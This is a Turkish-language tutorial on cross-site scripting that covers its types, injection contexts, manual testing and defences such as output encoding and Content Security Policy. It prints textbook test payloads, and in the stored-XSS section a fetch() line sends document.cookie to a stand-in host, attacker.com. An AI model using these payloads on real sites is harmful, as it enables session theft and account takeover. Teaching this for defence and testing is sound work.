# Cross-Site Scripting (XSS) Rehberi

## XSS Nedir?

**Cross-Site Scripting (XSS)**, bir web uygulamasının kullanıcıdan aldığı veriyi yeterince filtrelemeden veya encode etmeden tarayıcıya geri yansıtması sonucu ortaya çıkan kritik bir güvenlik açığıdır.

Bu açık sayesinde saldırgan:

- Kullanıcıların oturum bilgilerini çalabilir
- Kullanıcı adına işlem yaptırabilir
- Sahte içerik gösterebilir
- Tarayıcı üzerinden JavaScript çalıştırabilir

XSS, **OWASP Top 10** listesinde yer alan en yaygın web açıklarından biridir.

---

## XSS Gerçek Hayatta Nerelerde Çıkar?

Kullanıcıdan veri alan ve bu veriyi HTML olarak dönen her yer potansiyel hedeftir:

- Arama kutuları
- Yorum alanları
- Profil isimleri / biyografi alanları
- URL parametreleri (?q=)
- Hata mesajları
- Admin panelleri
- API’den gelen verilerin frontend’de render edilmesi

> Kısaca: **Kullanıcıdan gelen veri HTML’e giriyorsa, XSS ihtimali vardır.**

---

## XSS Nasıl Çalışır?

Zafiyetli bir senaryo:

```html
<p>Arama sonucu: {{ search }}</p>
```

Eğer uygulama `search` değerini filtrelemezse saldırgan şunu gönderir:

```html
<script>alert(1)</script>
```

Tarayıcı bunu **HTML + JavaScript** olarak algılar ve çalıştırır.

---

## XSS Türleri

### 1. Reflected XSS

Payload, request ile gönderilir ve response içinde anında geri döner.

```html
<script>alert(1)</script>
```

- URL parametrelerinde sık görülür
- Kurban linke tıklamak zorundadır
- En kolay tespit edilen XSS türüdür

---

### 2. Stored XSS (Persistent)

Payload veritabanına kaydedilir ve herkese gösterilir.

```html
<script>fetch('https://attacker.com/cookie?c='+document.cookie)</script>
```

- En tehlikeli XSS türüdür
- Forumlar, yorum sistemleri, profil alanlarında çıkar
- Bir kez girilir, herkesi etkiler

---

### 3. DOM-Based XSS

Zafiyet tamamen **frontend (JavaScript)** tarafındadır.

```javascript
document.getElementById("msg").innerHTML = location.hash;
```

URL:
```
#<script>alert(1)</script>
```

- Sunucu tarafında log bile oluşmayabilir
- Tespiti en zor türlerden biridir

---

## Neden XSS Tehlikelidir?

XSS sadece `alert(1)` değildir.

Bir saldırgan şunları yapabilir:

- `document.cookie` çalabilir
- CSRF token ele geçirebilir
- Keylogger çalıştırabilir
- Kullanıcıyı sahte sayfaya yönlendirebilir
- Admin yetkisi ele geçirebilir

---

## XSS Payload Mantığı (Ezber Değil)

Amaç şudur:

> **Tarayıcıya JavaScript çalıştırmak**

En basit payload:

```html
<script>alert(1)</script>
```

Ama çoğu zaman:

- `<script>` engellidir
- HTML encode vardır

Bu durumda farklı bağlamlar devreye girer:

- HTML context
- Attribute context
- JavaScript context

---

## XSS Context Kavramı (ÇOK KRİTİK)

Aynı payload her yerde çalışmaz.

### HTML Context
```html
<div>INPUT</div>
```

Payload:
```html
<script>alert(1)</script>
```

---

### Attribute Context
```html
<input value="INPUT">
```

Payload:
```html
" onmouseover="alert(1)
```

---

### JavaScript Context
```html
<script>
var x = 'INPUT';
</script>
```

Payload:
```javascript
';alert(1);// 
```

> XSS öğrenirken **context** öğrenmeden payload ezberlemek boşa zaman.

---

## XSS Nasıl Tespit Edilir?

Manuel test yaklaşımı:

- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `"><svg/onload=alert(1)>`

Gözlemlenecek şey:
- Alert çalışıyor mu?
- HTML kırılıyor mu?
- JS hatası oluşuyor mu?

---

## Savunma Tarafı – Ne İşe Yaramaz?

❌ Sadece blacklist yapmak
❌ `<script>` engellemek
❌ Input validation’a güvenmek

Bunlar **tek başına yeterli değildir**.

---

## Doğru Savunma Yöntemleri

### 1. Output Encoding (En Önemlisi)

Kullanıcıdan gelen veri **nerede kullanılıyorsa ona göre encode edilmelidir**.

- HTML → HTML Encode
- Attribute → Attribute Encode
- JS → JS Encode

---

### 2. Framework’lerin Otomatik Koruması

Modern framework’ler default olarak XSS’i engeller:

- React
- Angular
- Vue

Ama şu kullanım **tehlikelidir**:

```javascript
dangerouslySetInnerHTML
innerHTML
v-html
```

---

### 3. Content Security Policy (CSP)

Tarayıcı seviyesinde JavaScript çalışmasını sınırlar.

```http
Content-Security-Policy: script-src 'self'
```

---

## XSS ile SQL Injection Farkı (Mini Not)

| XSS | SQL Injection |
|---|---|
| Tarayıcı hedef | Veritabanı hedef |
| JS çalıştırılır | SQL mantığı bozulur |
| Client-side ağırlıklı | Server-side |
| Kullanıcıyı etkiler | Sistemi etkiler |

---

## Gerçek Hayat Senaryosu

Stored XSS → Admin paneli → Admin cookie → Yetki yükseltme
